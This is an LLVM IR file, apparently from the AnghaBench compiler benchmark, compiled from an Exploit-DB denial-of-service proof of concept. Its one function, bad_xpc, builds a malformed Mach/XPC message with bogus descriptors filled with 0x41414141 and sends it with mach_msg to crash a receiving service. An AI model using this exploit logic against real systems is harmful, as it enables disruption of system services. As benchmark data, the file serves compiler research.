; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/multiple/dos/extr_46297.c_bad_xpc.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/multiple/dos/extr_46297.c_bad_xpc.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.xpc_bad_ool = type { %struct.TYPE_10__, %struct.TYPE_9__, %struct.TYPE_8__, %struct.TYPE_7__, %struct.TYPE_6__, i32 }
%struct.TYPE_10__ = type { i32, i32, i32, i32 }
%struct.TYPE_9__ = type { i32, i32, i8* }
%struct.TYPE_8__ = type { i32, i32, i32 }
%struct.TYPE_7__ = type { i32, i32, i8* }
%struct.TYPE_6__ = type { i64 }

@MACH_MSG_TYPE_COPY_SEND = common dso_local global i32 0, align 4
@MACH_MSGH_BITS_COMPLEX = common dso_local global i32 0, align 4
@MACH_MSG_OOL_DESCRIPTOR = common dso_local global i8* null, align 8
@MACH_MSG_PORT_DESCRIPTOR = common dso_local global i32 0, align 4
@MACH_SEND_MSG = common dso_local global i32 0, align 4
@MACH_MSG_OPTION_NONE = common dso_local global i32 0, align 4
@MACH_PORT_NULL = common dso_local global i32 0, align 4
@MACH_MSG_TIMEOUT_NONE = common dso_local global i32 0, align 4
@KERN_SUCCESS = common dso_local global i64 0, align 8
@.str = private unnamed_addr constant [29 x i8] c"xpc message send failed: %s\0A\00", align 1
@EXIT_FAILURE = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [18 x i8] c"sent xpc message\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @bad_xpc(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i64, align 8
  %4 = alloca %struct.xpc_bad_ool, align 8
  store i32 %0, i32* %2, align 4
  %5 = bitcast %struct.xpc_bad_ool* %4 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 8 %5, i8 0, i64 80, i1 false)
  %6 = load i32, i32* @MACH_MSG_TYPE_COPY_SEND, align 4
  %7 = load i32, i32* @MACH_MSGH_BITS_COMPLEX, align 4
  %8 = call i32 @MACH_MSGH_BITS_SET(i32 %6, i32 0, i32 0, i32 %7)
  %9 = getelementptr inbounds %struct.xpc_bad_ool, %struct.xpc_bad_ool* %4, i32 0, i32 0
  %10 = getelementptr inbounds %struct.TYPE_10__, %struct.TYPE_10__* %9, i32 0, i32 3
  store i32 %8, i32* %10, align 4
  %11 = getelementptr inbounds %struct.xpc_bad_ool, %struct.xpc_bad_ool* %4, i32 0, i32 0
  %12 = getelementptr inbounds %struct.TYPE_10__, %struct.TYPE_10__* %11, i32 0, i32 0
  store i32 80, i32* %12, align 8
  %13 = load i32, i32* %2, align 4
  %14 = getelementptr inbounds %struct.xpc_bad_ool, %struct.xpc_bad_ool* %4, i32 0, i32 0
  %15 = getelementptr inbounds %struct.TYPE_10__, %struct.TYPE_10__* %14, i32 0, i32 2
  store i32 %13, i32* %15, align 8
  %16 = getelementptr inbounds %struct.xpc_bad_ool, %struct.xpc_bad_ool* %4, i32 0, i32 0
  %17 = getelementptr inbounds %struct.TYPE_10__, %struct.TYPE_10__* %16, i32 0, i32 1
  store i32 268435456, i32* %17, align 4
  %18 = getelementptr inbounds %struct.xpc_bad_ool, %struct.xpc_bad_ool* %4, i32 0, i32 4
  %19 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %18, i32 0, i32 0
  store i64 0, i64* %19, align 8
  %20 = getelementptr inbounds %struct.xpc_bad_ool, %struct.xpc_bad_ool* %4, i32 0, i32 3
  %21 = getelementptr inbounds %struct.TYPE_7__, %struct.TYPE_7__* %20, i32 0, i32 0
  store i32 1094795585, i32* %21, align 8
  %22 = getelementptr inbounds %struct.xpc_bad_ool, %struct.xpc_bad_ool* %4, i32 0, i32 3
  %23 = getelementptr inbounds %struct.TYPE_7__, %struct.TYPE_7__* %22, i32 0, i32 1
  store i32 16384, i32* %23, align 4
  %24 = load i8*, i8** @MACH_MSG_OOL_DESCRIPTOR, align 8
  %25 = getelementptr inbounds %struct.xpc_bad_ool, %struct.xpc_bad_ool* %4, i32 0, i32 3
  %26 = getelementptr inbounds %struct.TYPE_7__, %struct.TYPE_7__* %25, i32 0, i32 2
  store i8* %24, i8** %26, align 8
  %27 = getelementptr inbounds %struct.xpc_bad_ool, %struct.xpc_bad_ool* %4, i32 0, i32 2
  %28 = getelementptr inbounds %struct.TYPE_8__, %struct.TYPE_8__* %27, i32 0, i32 0
  store i32 1094795585, i32* %28, align 8
  %29 = getelementptr inbounds %struct.xpc_bad_ool, %struct.xpc_bad_ool* %4, i32 0, i32 2
  %30 = getelementptr inbounds %struct.TYPE_8__, %struct.TYPE_8__* %29, i32 0, i32 1
  store i32 17, i32* %30, align 4
  %31 = load i32, i32* @MACH_MSG_PORT_DESCRIPTOR, align 4
  %32 = getelementptr inbounds %struct.xpc_bad_ool, %struct.xpc_bad_ool* %4, i32 0, i32 2
  %33 = getelementptr inbounds %struct.TYPE_8__, %struct.TYPE_8__* %32, i32 0, i32 2
  store i32 %31, i32* %33, align 8
  %34 = getelementptr inbounds %struct.xpc_bad_ool, %struct.xpc_bad_ool* %4, i32 0, i32 1
  %35 = getelementptr inbounds %struct.TYPE_9__, %struct.TYPE_9__* %34, i32 0, i32 0
  store i32 1094795585, i32* %35, align 8
  %36 = getelementptr inbounds %struct.xpc_bad_ool, %struct.xpc_bad_ool* %4, i32 0, i32 1
  %37 = getelementptr inbounds %struct.TYPE_9__, %struct.TYPE_9__* %36, i32 0, i32 1
  store i32 16384, i32* %37, align 4
  %38 = load i8*, i8** @MACH_MSG_OOL_DESCRIPTOR, align 8
  %39 = getelementptr inbounds %struct.xpc_bad_ool, %struct.xpc_bad_ool* %4, i32 0, i32 1
  %40 = getelementptr inbounds %struct.TYPE_9__, %struct.TYPE_9__* %39, i32 0, i32 2
  store i8* %38, i8** %40, align 8
  %41 = getelementptr inbounds %struct.xpc_bad_ool, %struct.xpc_bad_ool* %4, i32 0, i32 0
  %42 = load i32, i32* @MACH_SEND_MSG, align 4
  %43 = load i32, i32* @MACH_MSG_OPTION_NONE, align 4
  %44 = or i32 %42, %43
  %45 = getelementptr inbounds %struct.xpc_bad_ool, %struct.xpc_bad_ool* %4, i32 0, i32 0
  %46 = getelementptr inbounds %struct.TYPE_10__, %struct.TYPE_10__* %45, i32 0, i32 0
  %47 = load i32, i32* %46, align 8
  %48 = load i32, i32* @MACH_PORT_NULL, align 4
  %49 = load i32, i32* @MACH_MSG_TIMEOUT_NONE, align 4
  %50 = load i32, i32* @MACH_PORT_NULL, align 4
  %51 = call i64 @mach_msg(%struct.TYPE_10__* %41, i32 %44, i32 %47, i32 0, i32 %48, i32 %49, i32 %50)
  store i64 %51, i64* %3, align 8
  %52 = load i64, i64* %3, align 8
  %53 = load i64, i64* @KERN_SUCCESS, align 8
  %54 = icmp ne i64 %52, %53
  br i1 %54, label %55, label %61

55:                                               ; preds = %1
  %56 = load i64, i64* %3, align 8
  %57 = call i8* @mach_error_string(i64 %56)
  %58 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str, i64 0, i64 0), i8* %57)
  %59 = load i32, i32* @EXIT_FAILURE, align 4
  %60 = call i32 @exit(i32 %59) #4
  unreachable

61:                                               ; preds = %1
  %62 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.1, i64 0, i64 0))
  br label %63

63:                                               ; preds = %61
  ret void
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #1

declare dso_local i32 @MACH_MSGH_BITS_SET(i32, i32, i32, i32) #2

declare dso_local i64 @mach_msg(%struct.TYPE_10__*, i32, i32, i32, i32, i32, i32) #2

declare dso_local i32 @printf(i8*, ...) #2

declare dso_local i8* @mach_error_string(i64) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
